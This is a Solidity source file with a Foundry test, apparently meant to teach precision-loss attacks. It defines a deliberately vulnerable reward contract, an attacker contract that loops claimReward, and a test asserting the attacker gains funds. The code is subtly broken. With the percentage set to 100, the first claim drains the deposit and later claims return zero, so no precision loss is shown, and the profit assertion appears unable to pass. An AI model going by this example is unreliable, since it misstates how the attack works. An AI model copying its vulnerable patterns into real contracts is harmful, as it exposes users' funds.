// SPDX-License-Identifier: MIT
/*
In Solidity, precision loss refers to the inaccuracy that can occur when performing arithmetic
operations with integer types due to the lack of support for floating-point numbers.
Solidity, like many other programming languages used in blockchain development, 
operates primarily with fixed-size integer types, such as uint256, uint128, etc. 
These types cannot represent fractions, leading to potential precision issues in certain 
calculations.
*/

/*
When a contract is vulnerable to precision loss, an attacker can exploit this vulnerability 
to manipulate calculations involving integer arithmetic, typically multiplication and division,
to gain more tokens or funds than intended by the contract's logic. 
Here’s how an attacker can take advantage of such vulnerabilities:
*/

pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract RewardContract {
    uint256 public totalRewards;
    mapping(address => uint256) public userRewards;

    function depositRewards() external payable {
        totalRewards += msg.value;
    }

    function calculateReward(address user, uint256 percentage) public view returns (uint256) {
        return (userRewards[user] * percentage) / 100;
    }

    function claimReward(uint256 percentage) external {
        uint256 reward = calculateReward(msg.sender, percentage);
        require(reward <= address(this).balance, "Not enough balance");
        payable(msg.sender).transfer(reward);
        userRewards[msg.sender] -= reward;
    }

    function depositUserRewards() external payable {
        userRewards[msg.sender] += msg.value;
    }
}

contract Attacker {
    RewardContract public rewardContract;

    constructor(address rewardContractAddress) {
        rewardContract = RewardContract(rewardContractAddress);
    }

    function exploit(uint256 percentage) external payable {
        // Deposit some ether to get initial rewards
        rewardContract.depositUserRewards{value: msg.value}();
        // Claim rewards repeatedly to exploit precision loss
        for (uint256 i = 0; i < 100; i++) {
            rewardContract.claimReward(percentage);
        }
        // Transfer remaining balance back to attacker
        payable(msg.sender).transfer(address(this).balance);
    }

    // Fallback function to receive ether
    receive() external payable {}
}

contract RewardContractTest is Test {
    RewardContract public rewardContract;
    Attacker public attacker;
    address public attackerAddress = address(0x1234);

    function setUp() public {
        rewardContract = new RewardContract();
        attacker = new Attacker(address(rewardContract));

        vm.deal(attackerAddress, 100 ether);
        vm.prank(attackerAddress);
        attacker.exploit{value: 1 ether}(100);
    }

     function testPrecisionLossExploit() public {
        uint256 initialBalance = address(rewardContract).balance;
        uint256 attackerInitialBalance = attackerAddress.balance;

        console.log("Initial Contract Balance:", initialBalance);
        console.log("Initial Attacker Balance:", attackerInitialBalance);

        vm.prank(attackerAddress);
        attacker.exploit{value: 1 ether}(100);

        uint256 finalBalance = address(rewardContract).balance;
        uint256 attackerFinalBalance = attackerAddress.balance;

        console.log("Final Contract Balance:", finalBalance);
        console.log("Final Attacker Balance:", attackerFinalBalance);

        assertGt(attackerFinalBalance, attackerInitialBalance);
        assertLt(finalBalance, initialBalance);
    }
}
